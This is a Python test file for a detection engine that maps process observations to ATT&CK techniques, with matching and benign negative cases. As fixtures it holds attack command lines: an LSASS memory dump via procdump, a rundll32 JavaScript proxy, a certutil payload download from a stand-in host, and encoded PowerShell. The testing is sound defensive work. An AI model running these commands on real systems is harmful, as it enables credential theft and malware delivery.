    obs = _obs("obs-1", host=HostRef(name="H"))
    results = engine.evaluate([obs])
    assert len(results) == 2

    single_detection = next(r for r in results if r.rule_ref.rule_id == "single")
    multi_detection = next(r for r in results if r.rule_ref.rule_id == "multi")

    single_evidences = derive_evidence_from_detection(single_detection, obs, knowledge=knowledge)
    multi_evidences = derive_evidence_from_detection(multi_detection, obs, knowledge=knowledge)

    assert len(single_evidences) == 1
    assert len(multi_evidences) == 2
    assert len({e.evidence_id for e in multi_evidences}) == 2  # no collision


# ===========================================================================
# 11. Guards: preserve Phase 0 invariants
# ===========================================================================


def _is_sources(module: str) -> bool:
    """The platform's ``sources`` package or a module in it (and nothing that
    merely contains the word, such as ``importlib.resources``)."""
    return "sources" in module.split(".")


def test_detection_package_never_imports_from_sources() -> None:
    """Static AST check: no module in detection/ imports attribution_platform.sources
    (Sysmon, or any future source, must never become a detection-layer
    dependency)."""
    detection_files = sorted(DETECTION_DIR.glob("*.py"))
    assert detection_files, "expected to find detection/*.py files"

    offending: list[str] = []
    for path in detection_files:
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.ImportFrom) and node.module and _is_sources(node.module):
                offending.append(f"{path.name}: from {node.module} import ...")
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if _is_sources(alias.name):
                        offending.append(f"{path.name}: import {alias.name}")

    assert not offending, f"detection/ must not import from sources/: {offending}"


def test_detection_package_never_imports_forbidden_layers() -> None:
    """detection/ must also never depend on dataplane/, replay/, or api/ --
    it is a pure, Elastic-free logic layer (mirrors the extraction/ and
    dataplane/ dependency-direction guards already established)."""
    forbidden = ("dataplane", "replay", "api")
    detection_files = sorted(DETECTION_DIR.glob("*.py"))

    offending: list[str] = []
    for path in detection_files:
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if (
                isinstance(node, ast.ImportFrom)
                and node.module
                and any(f"attribution_platform.{layer}" in node.module for layer in forbidden)
            ):
                offending.append(f"{path.name}: from {node.module} import ...")

    assert not offending, f"detection/ must not import dataplane/replay/api: {offending}"


_TECHNIQUE_ID = re.compile(r"\bT\d{4}(\.\d{3})?\b")
_TACTIC_ID = re.compile(r"\bTA\d{4}\b")
_KNOWN_ACTOR_STRINGS = (
    "APT1",
    "APT28",
    "APT29",
    "Fancy Bear",
    "Cozy Bear",
    "Lazarus",
    "Sandworm",
    "Sofacy",
    "Turla",
    "Equation Group",
)


def test_no_hard_coded_attack_ids_in_detection_source() -> None:
    for path in DETECTION_DIR.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        assert not _TECHNIQUE_ID.search(text), f"hard-coded technique id in {path.name}"
        assert not _TACTIC_ID.search(text), f"hard-coded tactic id in {path.name}"


def test_no_hard_coded_actor_names_in_detection_source() -> None:
    for path in DETECTION_DIR.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        for actor in _KNOWN_ACTOR_STRINGS:
            assert actor not in text, f"hard-coded actor name {actor!r} in {path.name}"


def test_no_attribution_or_scoring_symbols_in_detection_source() -> None:
    """No candidate-generation/correlation/attack-chain/scoring vocabulary
    anywhere in this gate's source -- it must stay a pure detection layer.

    ``"attribution"`` itself is deliberately excluded from this list: it is
    a substring of the package's own name (``attribution_platform``), which
    legitimately appears in every import statement in every module of this
    project. The specific compound terms below (``AttributionResult``,
    ``attribution_score``, ...) are what would actually indicate attribution
    *logic* creeping in.
    """
    forbidden_terms = (
        "Candidate",
        "Hypothesis",
        "AttackChain",
        "Likelihood",
        "Confidence",
        "correlate",
        "AttributionResult",
        "AttributionAssessment",
        "attribution_score",
        "attribution_confidence",
    )
    for path in DETECTION_DIR.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        for term in forbidden_terms:
            assert term not in text, f"forbidden term {term!r} found in {path.name}"


# ===========================================================================
# 12. G1.3: four new rules added to the core corpus
# ===========================================================================


@pytest.mark.parametrize(
    ("rule_id", "external_id"),
    [
        ("platform-procdump-lsass-dump", "T1003.001"),
        ("platform-rundll32-javascript-proxy", "T1218.011"),
        ("platform-office-spawns-cmd-shell", "T1059.003"),
        ("platform-certutil-ingress-transfer", "T1105"),
    ],
)
def test_g13_rule_carries_the_expected_validated_technique(
    knowledge: AttackKnowledge, rule_id: str, external_id: str
) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    rule = next(r for r in pack.rules if r.rule_ref.rule_id == rule_id)
    assert len(rule.technique_mappings) == 1
    mapping = rule.technique_mappings[0]
    assert mapping.attack_ref.external_id == external_id
    assert mapping.attack_ref.attack_kb_version == knowledge.attack_kb_version
    assert rule.evidence_type == EvidenceType.BEHAVIORAL


def test_g13_procdump_rule_matches_lsass_target_and_maps_to_credential_dumping(
    knowledge: AttackKnowledge,
) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1",
        process=ProcessRef(name="procdump.exe", command_line="procdump.exe -ma lsass.exe out.dmp"),
    )
    (detection,) = engine.evaluate([obs])
    assert detection.rule_ref.rule_id == "platform-procdump-lsass-dump"
    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
    assert evidence.attack_ref is not None
    assert evidence.attack_ref.external_id == "T1003.001"


def test_g13_procdump_rule_does_not_match_non_lsass_target(knowledge: AttackKnowledge) -> None:
    """Relevant negative: same tool, different (non-lsass) dump target --
    proves the AND semantics require both conditions, not just the tool name."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1",
        process=ProcessRef(
            name="procdump.exe", command_line="procdump.exe -ma notepad.exe out.dmp"
        ),
    )
    assert engine.evaluate([obs]) == ()


def test_g13_rundll32_rule_matches_javascript_proxy_pattern(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1",
        process=ProcessRef(
            name="rundll32.exe",
            command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
        ),
    )
    (detection,) = engine.evaluate([obs])
    assert detection.rule_ref.rule_id == "platform-rundll32-javascript-proxy"
    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
    assert evidence.attack_ref is not None
    assert evidence.attack_ref.external_id == "T1218.011"


def test_g13_rundll32_rule_does_not_match_benign_control_panel_invocation(
    knowledge: AttackKnowledge,
) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1",
        process=ProcessRef(
            name="rundll32.exe", command_line="rundll32.exe shell32.dll,Control_RunDLL"
        ),
    )
    assert engine.evaluate([obs]) == ()


def test_g13_office_shell_rule_matches_cmd_spawned_by_word(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs("obs-1", process=ProcessRef(name="cmd.exe", parent_name="WINWORD.EXE"))
    (detection,) = engine.evaluate([obs])
    assert detection.rule_ref.rule_id == "platform-office-spawns-cmd-shell"
    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
    assert evidence.attack_ref is not None
    assert evidence.attack_ref.external_id == "T1059.003"


def test_g13_office_shell_rule_matches_cmd_spawned_by_excel_too(knowledge: AttackKnowledge) -> None:
    """The 'in' operator's second listed parent must match too, not just the first."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs("obs-1", process=ProcessRef(name="cmd.exe", parent_name="EXCEL.EXE"))
    (detection,) = engine.evaluate([obs])
    assert detection.rule_ref.rule_id == "platform-office-spawns-cmd-shell"


def test_g13_office_shell_rule_does_not_match_cmd_spawned_by_explorer(
    knowledge: AttackKnowledge,
) -> None:
    """Relevant negative: same child process, parent not in the declared set."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs("obs-1", process=ProcessRef(name="cmd.exe", parent_name="EXPLORER.EXE"))
    assert engine.evaluate([obs]) == ()


def test_g13_certutil_rule_matches_urlcache_download(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1",
        process=ProcessRef(
            name="certutil.exe",
            command_line="certutil.exe -urlcache -split -f http://example.invalid/x payload.exe",
        ),
    )
    (detection,) = engine.evaluate([obs])
    assert detection.rule_ref.rule_id == "platform-certutil-ingress-transfer"
    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
    assert evidence.attack_ref is not None
    assert evidence.attack_ref.external_id == "T1105"


def test_g13_certutil_rule_does_not_match_unrelated_hashfile_usage(
    knowledge: AttackKnowledge,
) -> None:
    """Relevant negative: same tool, an ordinary certutil operation with no
    download flag."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1",
        process=ProcessRef(
            name="certutil.exe", command_line="certutil.exe -hashfile file.txt SHA256"
        ),
    )
    assert engine.evaluate([obs]) == ()


def test_g13_new_rule_detection_and_evidence_ids_embed_rule_pack_content_hash(
    knowledge: AttackKnowledge,
) -> None:
    """Same proof as G1.0's identity follow-up (section 10), reapplied to one
    of G1.3's new rules: deterministic ids, and the rule-pack content hash
    is preserved onto Evidence.provenance.method_content_hash."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1",
        process=ProcessRef(name="procdump.exe", command_line="procdump.exe -ma lsass.exe out.dmp"),
    )

    (detection_1,) = engine.evaluate([obs])
    (detection_2,) = engine.evaluate([obs])
    expected_id = f"platform-procdump-lsass-dump::1.0::{pack.content_hash}::obs-1"
    assert detection_1.detection_id == detection_2.detection_id == expected_id

    (evidence_1,) = derive_evidence_from_detection(detection_1, obs, knowledge=knowledge)
    (evidence_2,) = derive_evidence_from_detection(detection_2, obs, knowledge=knowledge)
    assert evidence_1.evidence_id == evidence_2.evidence_id
    assert evidence_1.provenance.method_content_hash == pack.content_hash


def test_g13_new_rule_with_tampered_stix_id_fails_closed(
    tmp_path: Path, knowledge: AttackKnowledge
) -> None:
    """Proves the fail-closed ATT&CK validation applies to G1.3's new rules
    specifically, not just the generic hypothetical case in section 6: take
    the actual checked-in corpus file's content and corrupt one new rule's
    stix_id -- the pack must not load."""
    data = json.loads(CORE_RULES_PATH.read_text(encoding="utf-8"))
    for rule in data["rules"]:
        if rule["rule_id"] == "platform-procdump-lsass-dump":
            rule["technique_mappings"][0]["stix_id"] = (
                "attack-pattern--00000000-0000-0000-0000-000000000000"
            )
    path = _write(tmp_path, data)
    with pytest.raises(DetectionError, match="does not resolve"):
        load_rule_pack(path, knowledge=knowledge)


def test_g13_existing_two_rules_still_behave_identically(knowledge: AttackKnowledge) -> None:
    """The two G1.0 rules must still fire exactly as before, unaffected by
    the four new rules appended after them in the same pack."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)

    powershell_obs = _obs(
        "obs-ps", process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
    )
    (ps_detection,) = engine.evaluate([powershell_obs])
    assert ps_detection.rule_ref.rule_id == "platform-encoded-powershell"
    assert ps_detection.technique_mappings[0].attack_ref.external_id == "T1059.001"

    logon_obs = _obs("obs-logon", event=EventMetadata(action="User logon successful"))
    (logon_detection,) = engine.evaluate([logon_obs])
    assert logon_detection.rule_ref.rule_id == "platform-interactive-logon"
    assert logon_detection.technique_mappings == ()
